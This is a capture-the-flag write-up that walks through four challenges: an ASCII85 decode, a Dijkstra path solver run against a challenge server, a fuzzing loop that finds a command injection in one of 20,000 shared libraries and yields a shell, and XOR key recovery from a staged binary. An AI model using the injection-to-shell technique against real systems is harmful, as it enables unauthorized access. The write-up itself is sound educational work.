# Mic Check

```
Decode: 9P&;gFD,5.BOPCdBl7Q+@V’1dDK?qL
```

This was a guess-god challenge and it took me 20 minutes of googling to try all the obscure encodings. In the end, it was ASCII85. 
By using an online decoder, this is what it decoded to:

```
Let the hacking begins ~
```

Which is the flag. I absolutely hated the fact that there is no flag format.

----

# algo_auth

```
Algorithm

nc 110.10.147.104 15712
```

We are provided with a IP and a port. This is what you get when connecting:

```
==> Hi, I like an algorithm. So, i make a new authentication system.
==> It has a total of 100 stages.
==> Each stage gives a 7 by 7 matrix below sample.
==> Find the smallest path sum in matrix, 
    by starting in any cell in the left column and finishing in any cell in the right column, 
    and only moving up, down, and right.
==> The answer for the sample matrix is 12.
==> If you clear the entire stage, you will be able to authenticate.

[sample]
99 99 99 99 99 99 99 
99 99 99 99 99 99 99 
99 99 99 99 99 99 99 
99 99 99 99 99 99 99 
99  1  1  1 99  1  1 
 1  1 99  1 99  1 99 
99 99 99  1  1  1 99 

If you want to start, type the G key within 10 seconds....>>
```

This looks like graph problem in the first glance and the problem statements calls for dijikstra. Since I have been doing competitive programming for a long time, this was trivial.
Here is my final script:

```python
from pwn import *


def sice_map(grid):
	cur_queue = [[grid[n][0],n,0] for n in range(len(grid))]
	visited = {}
	while len(cur_queue) != 0:
		cur_queue.sort(key=lambda node: node[0])
		distance,y,x = cur_queue.pop(0)
		if y in visited and x in visited[y]:
			continue
		if y not in visited:
			visited[y] = {}
		visited[y][x] = True

		if x == len(grid[y])-1:
			return distance

		if y+1 <= len(grid)-1 and not (y+1 in visited and x in visited[y+1]):
			cur_queue.append([distance+grid[y+1][x], y+1, x])
		if y-1 >= 0 and not (y-1 in visited  and x in visited[y-1]):
			cur_queue.append([distance+grid[y-1][x], y-1, x])
		if x+1 <= len(grid[y]) and not (y in visited and x+1 in visited[y]):
			cur_queue.append([distance+grid[y][x+1], y, x+1])
	return None



r = remote('110.10.147.104', 15712)
r.sendline('g')
sols = []
for m in range(100):
    header = r.recvuntil('***\n')
    #print header  
    grid  = r.recvuntil('\n\n',drop=True)
    print grid 
    grid_mapped = [map(int,line.strip().lstrip().replace("  ", " ").split(" ")) for line in grid.split("\n")] 
    cur_sol = sice_map(grid_mapped)
    print cur_sol
    r.recvuntil('>>> ')
    sols.append(cur_sol)
    r.sendline(str(cur_sol))

print ''.join([chr(X) for X in sols])
r.interactive()
```

The one thing I got stuck on was the final part. After solving 100 stages, this is what the server returns:
```
@@@@@ Congratz! Your answers are an answer
```

It took me quite a while to finally guess that we have to convert our solutions to ASCII and base64 decode them.

```
FLAG : g00ooOOd_j0B!!!___uncomfort4ble__s3curity__is__n0t__4__security!!!!!
```

---

# 20000

```
nc 110.10.147.106 15959
```

We are provided with 20000 shared objects and one binary. Here is the pseudocode for the binary recovered by the community sponsored version of hex-rays:

```
  unsigned __int64 v13; // [rsp+88h] [rbp-18h]

  v13 = __readfsqword(0x28u);
  sub_400A06(a1, a2, a3);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  memset(&s, 0, 0x60uLL);
  v11 = 0;
  printf("INPUT : ", 0LL, &v12);
  __isoc99_scanf("%d", &v7);
  if ( v7 <= 0 && v7 > 20000 )
  {
    printf("Invalid Input", &v7);
    exit(-1);
  }
  sprintf(&s, "./20000_so/lib_%d.so", (unsigned int)v7);
  handle = dlopen(&s, 1);
  if ( handle )
  {
    v5 = handle;
    v8 = (void (__fastcall *)(void *, const char *))dlsym(handle, "test");
    if ( v8 )
    {
      v8(v5, "test");
      dlclose(handle);
      result = 0LL;
    }
    else
    {
      v6 = dlerror();
      fprintf(stderr, "Error: %s\n", v6);
      dlclose(handle);
      result = 1LL;
    }
  }
  else
  {
    v3 = dlerror();
    fprintf(stderr, "Error: %s\n", v3);
    result = 1LL;
  }
  return result;
}
```

It basically loads a shared object of the number we input from the `20000_so` folder and calls the `test` function. 

By analyzing a couple binaries, I came to the conclusion that each of them takes a 0x32 byte string as input, then maybe check it against `filter(1/2)` function and then maybe pass it to `system()` as a param to "ls"

There is an obvious command injection but the filters were pretty strict. Actually, the `filter(1/2)` were loaded from other shared libraries by the shared library.

Instead of scripting an auto analyzer with something like binja, I decided to fuzz it first. Here is my basic zsh onliner:

```
for m in {0..20000}; do echo -e "$m\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"|./20000 2>&1| tail -n 2 >>! out;echo "$m" >>! out; done
```

Just fuzzing with shitty AAAAAAs actually proved fruitful while sorting through the logs:

```
$ cat out|grep -v "INPUT"|grep -v 'ls: cannot access'|grep -v 'How do you find vulnerable file?' > out2

$ cat out2
....
17391
17392
17393
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@: not found
*** stack smashing detected ***: <unknown> terminated
17394
17395
17396
...
```

Looks like in lib 17394, our input gets directly executed, Let's try it again:

```
$ ./20000

   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  
  /$$__  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ 
 |__/  \ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$ 
   /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$ 
  /$$____/ | $$\ $$$$| $$\ $$$$| $$\ $$$$| $$\ $$$$ 
 | $$      | $$ \ $$$| $$ \ $$$| $$ \ $$$| $$ \ $$$ 
 | $$$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/ 
 |________/ \______/  \______/  \______/  \______/  

INPUT : 17394
This is lib_17394 file.
How do you find vulnerable file?
/bin/sh
$ id 
uid=1000(jazzy) gid=1000(jazzy) groups=1000(jazzy)
```

Oh wow, this was easier than I expected. Maybe I got lucky? I didn't even have to reverse much.

Here is the flag from remote:

```
flag{Are_y0u_A_h@cker_in_real-word?}
```

------

# KingMaker

```
nc 110.10.147.104 13152
```

We are provided with a binary which implements a role playing interface. The whole binary is divided into 5 stages and each stage is decrypted dnyamically after we solve the previous stage.

Each stage involved entering a "key" which acted a repeating XOR key for the next stage. Here is the pesudocode of a typical stage:

```
void __cdecl level_x()
{
  char key[8]; // [rsp+0h] [rbp-10h]
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts_0("You : Am I....??");
  puts_0("Servant : The king calls the prince!");
  puts_0("...");
  puts_0(".....");
  puts_0(".......\n");
  puts_0("King : I'm too old to rule the kingdom.");
  puts_0("King : So I will give you few tests and choose the next king.");
  puts_0("King : The only one prince who passes all the tests can be the king.\n");
  puts_0("King : If you want to participate at this test, Enter the key for test 1");
  __isoc99_scanf("%s", key);
  printf("\x1B[H\x1B[J");
  if ( !(unsigned int)check_key(key, 1u, 5u) )
    exit_flag("King : Wrong! Don't you want to be a king?", 0);
  xor_decrypt(test_2, int_f0, key);
  next_level(key);
}
```

Since all the functions begin from the same prologue `push rbp; mov rbp, rsp`, we are easily able to recover the 4 byte keys of the first 2 stages.

For the stages 3,4 and 5 which had larger keys, we abused that fact that the functions in each stage are similar, so we just xor the start of the encrypted function with the similar decrypted function.

Here are the keys in order:

```
lOv3
D0l1
HuNgRYT1m3
F0uRS3aS0n
T1kT4kT0Kk
```

There was also a weird challenge we had to solve after the 4th stage, basically this:

```
signed __int64 __fastcall sub_401793(const char *a1)
{
  int v2; // [rsp+18h] [rbp-78h]
  signed int i; // [rsp+1Ch] [rbp-74h]
  char dest[16]; // [rsp+20h] [rbp-70h]
  char v5[26]; // [rsp+30h] [rbp-60h]
  char v6[32]; // [rsp+50h] [rbp-40h]
  char v7; // [rsp+72h] [rbp-1Eh]
  unsigned __int64 v8; // [rsp+78h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  qmemcpy(v5, "ABCDEFGHIJKLMNOPQRSTUVWXYZ", sizeof(v5));
  strcpy(v6, "ALICEAWTQJMJXTSPPZVCIDGQYRDINMCP");
  v7 = 0;
  v2 = 0;
  strncpy(dest, a1, 5uLL);
  for ( i = 5; i < strlen(a1); ++i )
  {
    if ( v5[(a1[i] - 65 + dest[v2] - 65) % 26] != v6[i] )
      return 0LL;
    v2 = (v2 + 1) % 5;
  }
  return 1LL;
}
```

It basically splits the strings into two parts from the 5th index, then compares the look-up of the ASCII in our string with a hardcoded value. By using a 5 byte `AAAAA` prefix, I created this string that passed all the checks

```
AAAAAAWTQJMJXTSPPZVCIDGQYRDINMCP
```

Now the only thing left for me to do to make the 5 global variables equal to 5 at the end. Actually, after completing each stage, we are able to add a specific sum to each of those 5 global variables and in the end, we have to make all of them equal to 5.


Here is my script which employs a simple DFS to solve which path will equal 5:

```python
levels = [ [[2,0,0,1,0],[2,0,1,0,0],[2,0,2,1,0]] ,
         [[0,0,1,0,2],[0,-1,0,0,-1],[0,2,0,0,0]],
         [[-1,0,-1,1,0],[1,2,0,0,0],[1,1,0,0,0]],
         [[1,1,1,1,2], [1,2,2,1,2], [1,1,0,2,0], [1,1,1,2,0]],
         [[0,0,1,1,0],[0,-1,2,0,0],[0,-1,1,1,0]],
         [[1,-1,-1,2,2],[0,0,0,0,0],[1,0,0,0,1]],
         [[0,1,1,2,0]],
         [[0,1,1,1,0],[0,1,0,0,0]],
         [[-1,0,0,1,1], [0,0,1,2,1], [0,0,0,2,2]] ]

solution=[]

def dfs_level(cnts,lvl):
    if lvl == len(levels):
        if all([X == 5 for X in cnts]):
            return True
        return False

    for cur_lvl in levels[lvl]:
        new_cnt = [cur_lvl[X]+cnts[X] for X in range(len(cur_lvl))]
        if dfs_level(new_cnt, lvl+1):
            solution.append(cur_lvl)
            return True
    return False

dfs_level([0,0,0,0,0],  0)
print solution
```

Now inputting the right path and keys by hand, the flag was returned

```
He_C@N'T_see_the_f0rest_foR_TH3_TRee$
```

Jazzy


























